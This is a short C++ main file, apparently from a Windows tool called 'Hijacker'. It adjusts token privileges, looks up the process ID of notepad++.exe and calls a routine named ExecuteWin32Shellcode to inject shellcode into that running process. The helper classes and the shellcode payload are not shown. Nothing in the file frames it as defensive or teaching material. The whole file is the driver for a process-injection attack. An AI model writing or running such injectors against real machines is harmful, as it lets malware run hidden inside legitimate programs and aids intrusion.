#include "includes.h"
#include "hijacker.h"
#include "logger.hpp"
#include "exception.h"

using namespace TB;
using Hijacker::System;
using Hijacker::Interceptor;

#pragma region MainGlobals
const char* m_win32ProcessName = "notepad++.exe";

int main()
{
	System sys;
	Interceptor incp;
	Exception exp;

	sys.returnVersionState();
	if (sys.returnPrivilegeEscalationState())
	{
		std::cout << "Token Privileges Adjusted\n";
	}
	
	if (DWORD m_procId = incp.FindWin32ProcessId((PCHAR)m_win32ProcessName))
	{
		incp.ExecuteWin32Shellcode(m_procId);
	}

	system("PAUSE");
	return 0;
}